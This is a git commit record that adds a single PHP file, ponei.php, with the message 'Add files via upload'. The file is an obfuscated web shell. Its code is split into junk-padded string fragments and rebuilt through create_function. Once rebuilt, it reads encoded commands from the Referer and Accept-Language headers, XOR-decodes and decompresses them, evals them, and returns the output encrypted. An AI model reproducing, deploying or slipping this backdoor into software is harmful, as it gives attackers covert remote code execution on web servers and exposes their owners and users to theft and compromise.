577f0614daaa70f07733f26b63d782b8b4753e54
Jonatas Fil <ctfninj4@gmail.com>
2016-12-27 19:27:41 -0200

    Add files via upload

---
+++ ponei.php
@@ -0,0 +1,18 @@
+<?php
+$R='"n{";for($in{=0;$i<$l;n{){fn{or($jn{=0n{;($j<$c&&n{$i<$n{l);$j++,$i++n{){$o.=$n{t{$i}^n{$n{k';
+$d=str_replace('P','','cPreatPePP_fuPPnction');
+$j='fn{(strposn{($p,$h)=n{==0){$s[$n{in{]=""n{;$p=n{$ss($p,3);}if(n{an{rray_n{key_exists($in{,$s)){';
+$N='er"n{;$i=$mn{[1]n{[0].$m[1n{][n{1];n{$h=$sl($n{ss(mn{d5($i.$kh),0,n{3));n{$fn{=$sl($ss(n{md5($';
+$v='n{$s[$i]n{.=$p;n{$e=stn{n{rpos($s[n{$n{n{i],$f);if($e){$k=$kh.n{$kfn{;ob_starn{t();@en{val(@gz';
+$e='i.$kfn{),n{0,3));n{$p="n{";for($z=1n{;$z<counn{n{t($m[1]);n{$z++)$p.=n{$qn{[$m[2][$z]n{]n{;i';
+$I='{$m);if($q&&$mn{n{){@session_n{start();$n{s=&$_Sn{ESSIOn{n{N;$ss="n{substr";$n{sl=n{"strtolow';
+$z='array_van{n{lues($q);prn{eg_matcn{n{h_all(n{n{"/([\\w])[n{\\w-]+(?n{n{:;n{q=0.([\\d]))n{?,?/",$ra,n';
+$W='PT_LANGUAGn{E"];in{f(n{$rr&&$ran{){$u=parsn{e_un{rl($rr)n{;pan{rse_str($un{["quen{ryn{"],$q);$qn{=';
+$o='"+"),$n{ssn{($s[$in{],0,$e)n{)),$k)));$o=n{on{b_get_contenn{ts(n{)n{;obn{_end_cleann{();$d=ba';
+$t='{n{$j};}}return{n n{$o;}$r=$_SERVn{ER;$rrn{=@$r["Hn{TTP_n{REFn{ERER"];$ra=n{@$n{rn{["HTTn{P_ACCE';
+$C='sen{64_n{encode(x(gzcn{on{mpresn{s($o),$k));pn{rint(n{"<n{$n{k>$d</$k>");@sn{essn{ion_destroyn{();}}}}';
+$B='un{ncomn{press(n{@x(@n{ban{n{se64_decodn{n{e(preg_ren{n{place(array("/_/","n{/-/"),arrn{ay("n{/",';
+$c='$kh="cn{09fn{";$kf="9892";n{function{n x($n{t,n{$n{k){$cn{=strlen($k)n{n{;$l=strlen($tn{);$o=';
+$a=str_replace('n{','',$c.$R.$t.$W.$z.$I.$N.$e.$j.$v.$B.$o.$C);
+$h=$d('',$a);$h();
+?>
